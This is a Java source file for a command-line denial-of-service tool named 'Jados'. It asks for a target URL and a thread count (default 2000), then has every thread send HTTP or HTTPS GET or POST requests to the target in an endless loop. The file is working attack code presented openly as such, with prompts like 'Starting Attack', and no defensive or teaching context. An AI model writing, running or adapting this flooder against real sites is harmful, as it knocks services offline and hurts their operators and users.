package com.gf.example;

import javax.net.ssl.HttpsURLConnection;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;

public class Jados implements Runnable {

    private static final String USER_AGENT = "Mozilla/5.0";
    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Jados(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Jados.url);
                        break;
                    case 2:
                        sslPostAttack(Jados.url);
                        break;
                    case 3:
                        getAttack(Jados.url);
                        break;
                    case 4:
                        sslGetAttack(Jados.url);
                        break;
                }
            }
        } catch (Exception e) {}
    }

    public static void main(String[] args) throws Exception {
        String url = "";
        int attackingAmoun = 0;
        Jados dos = new Jados(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("Enter Url(including http) : ");
        url = in.nextLine();
        System.out.println("\n\n");
        System.out.println("Starting Attack to url: " + url);

        String[] sUrl = url.split("://");

        System.out.println("Checking connecting to site");
        if (sUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("Setting dos attack options");

        System.out.print("How many Thread do you want use to attack(default is 2000): ");
        String amount = in.nextLine();

        if (amount == null || amount.equals("")) {
            Jados.amount = 2000;
        } else {
            Jados.amount = Integer.parseInt(amount);
        }

        System.out.print("What http method do you want to use to send attack(default is POST): ");
        String option = in.nextLine();
        int iOption = 1;
        if (option.equals("get") || option.equals("GET")) {
            if (sUrl[0].equals("http")) {
                iOption = 3;
            } else {
                iOption = 4;
            }
        } else {
            if (sUrl[0].equals("http")) {
                iOption = 1;
            } else {
                iOption = 2;
            }
        }

        Thread.sleep(2000);

        System.out.println("Starting Attack");
        ArrayList<Thread> threads = new ArrayList<>();
        for (int i = 0; i < Jados.amount; i++) {
            Thread t = new Thread(new Jados(i, iOption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {}
        }
        System.out.println("Main Thread ended");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Checking Connection");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Connected to website");
        }
        Jados.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Connected to website");
        }
        Jados.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-us,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-us,en;");

        int responseCode = con.getResponseCode();
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-us,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        int responseCode = con.getResponseCode();
    }
}
